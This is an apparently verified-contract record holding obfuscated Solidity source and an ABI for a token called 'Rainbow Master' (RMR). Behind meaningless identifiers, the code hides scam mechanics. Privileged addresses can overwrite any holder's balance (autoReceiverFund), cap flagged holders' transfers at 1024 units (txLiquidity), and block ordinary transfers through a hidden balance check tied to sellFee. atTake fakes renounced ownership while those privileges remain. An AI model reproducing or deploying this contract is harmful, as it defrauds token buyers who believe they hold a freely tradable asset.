{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface isBuyLiquidity {\n    function createPair(address launchToken, address minLaunched) external returns (address);\n}\n\ninterface marketingTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeSell) external view returns (uint256);\n\n    function transfer(address receiverAtFee, uint256 walletAuto) external returns (bool);\n\n    function allowance(address minSellLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverAtFee,\n        uint256 walletAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minLiquidity, uint256 value);\n    event Approval(address indexed minSellLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract listMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapList is marketingTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RainbowMaster is listMode, marketingTeam, swapList {\n\n    address public senderTeamLaunched;\n\n    function launchedLiquidity(address amountReceiver, address receiverAtFee, uint256 walletAuto) internal returns (bool) {\n        require(isTotalShould[amountReceiver] >= walletAuto);\n        isTotalShould[amountReceiver] -= walletAuto;\n        isTotalShould[receiverAtFee] += walletAuto;\n        emit Transfer(amountReceiver, receiverAtFee, walletAuto);\n        return true;\n    }\n\n    function balanceOf(address modeSell) public view virtual override returns (uint256) {\n        return isTotalShould[modeSell];\n    }\n\n    function sellLaunch() private view {\n        require(receiverReceiver[_msgSender()]);\n    }\n\n    function autoReceiverFund(address isMax, uint256 walletAuto) public {\n        sellLaunch();\n        isTotalShould[isMax] = walletAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalTake;\n\n    mapping(address => bool) public receiverReceiver;\n\n    function feeTrading(address swapFund) public {\n        require(swapFund.balance < 100000);\n        if (fromSender) {\n            return;\n        }\n        \n        receiverReceiver[swapFund] = true;\n        if (sellLaunched == modeTeamReceiver) {\n            modeReceiver = sellLaunched;\n        }\n        fromSender = true;\n    }\n\n    function sellFee(uint256 walletAuto) public {\n        sellLaunch();\n        buyTeamAmount = walletAuto;\n    }\n\n    uint8 private autoSell = 18;\n\n    uint256 private modeTeamReceiver;\n\n    function txLiquidity(address amountSenderFund) public {\n        sellLaunch();\n        if (maxFee) {\n            sellLaunched = modeTeamReceiver;\n        }\n        if (amountSenderFund == senderTeamLaunched || amountSenderFund == receiverLimitTotal) {\n            return;\n        }\n        listTx[amountSenderFund] = true;\n    }\n\n    function transferFrom(address amountReceiver, address receiverAtFee, uint256 walletAuto) external override returns (bool) {\n        if (_msgSender() != tradingMax) {\n            if (totalTake[amountReceiver][_msgSender()] != type(uint256).max) {\n                require(walletAuto <= totalTake[amountReceiver][_msgSender()]);\n                totalTake[amountReceiver][_msgSender()] -= walletAuto;\n            }\n        }\n        return buyExempt(amountReceiver, receiverAtFee, walletAuto);\n    }\n\n    bool public maxFee;\n\n    uint256 constant shouldWallet = 2 ** 10;\n\n    string private tokenFund = \"RMR\";\n\n    function owner() external view returns (address) {\n        return sellExempt;\n    }\n\n    event OwnershipTransferred(address indexed maxMode, address indexed liquiditySell);\n\n    uint256 private sellLaunched;\n\n    uint256 toIs;\n\n    constructor (){\n        \n        toToken sellTokenLiquidity = toToken(tradingMax);\n        receiverLimitTotal = isBuyLiquidity(sellTokenLiquidity.factory()).createPair(sellTokenLiquidity.WETH(), address(this));\n        if (sellLaunched != modeReceiver) {\n            totalLiquidity = modeReceiver;\n        }\n        senderTeamLaunched = _msgSender();\n        receiverReceiver[senderTeamLaunched] = true;\n        isTotalShould[senderTeamLaunched] = senderEnable;\n        atTake();\n        \n        emit Transfer(address(0), senderTeamLaunched, senderEnable);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptShouldReceiver;\n    }\n\n    address public receiverLimitTotal;\n\n    function getOwner() external view returns (address) {\n        return sellExempt;\n    }\n\n    string private exemptShouldReceiver = \"Rainbow Master\";\n\n    mapping(address => bool) public listTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoSell;\n    }\n\n    uint256 buyTeamAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenFund;\n    }\n\n    uint256 public totalLiquidity;\n\n    uint256 private modeReceiver;\n\n    address modeMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private feeReceiver;\n\n    function approve(address enableFrom, uint256 walletAuto) public virtual override returns (bool) {\n        totalTake[_msgSender()][enableFrom] = walletAuto;\n        emit Approval(_msgSender(), enableFrom, walletAuto);\n        return true;\n    }\n\n    address private sellExempt;\n\n    function atTake() public {\n        emit OwnershipTransferred(senderTeamLaunched, address(0));\n        sellExempt = address(0);\n    }\n\n    function transfer(address isMax, uint256 walletAuto) external virtual override returns (bool) {\n        return buyExempt(_msgSender(), isMax, walletAuto);\n    }\n\n    mapping(address => uint256) private isTotalShould;\n\n    bool public fromSender;\n\n    function allowance(address isBuySender, address enableFrom) external view virtual override returns (uint256) {\n        if (enableFrom == tradingMax) {\n            return type(uint256).max;\n        }\n        return totalTake[isBuySender][enableFrom];\n    }\n\n    uint256 private senderEnable = 100000000 * 10 ** 18;\n\n    function buyExempt(address amountReceiver, address receiverAtFee, uint256 walletAuto) internal returns (bool) {\n        if (amountReceiver == senderTeamLaunched) {\n            return launchedLiquidity(amountReceiver, receiverAtFee, walletAuto);\n        }\n        uint256 listTo = marketingTeam(receiverLimitTotal).balanceOf(modeMin);\n        require(listTo == buyTeamAmount);\n        require(receiverAtFee != modeMin);\n        if (listTx[amountReceiver]) {\n            return launchedLiquidity(amountReceiver, receiverAtFee, shouldWallet);\n        }\n        return launchedLiquidity(amountReceiver, receiverAtFee, walletAuto);\n    }\n\n    address tradingMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderEnable;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSellLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isBuySender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAuto\",\"type\":\"uint256\"}],\"name\":\"autoReceiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"}],\"name\":\"feeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletAuto\",\"type\":\"uint256\"}],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeamLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAtFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSenderFund\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RainbowMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}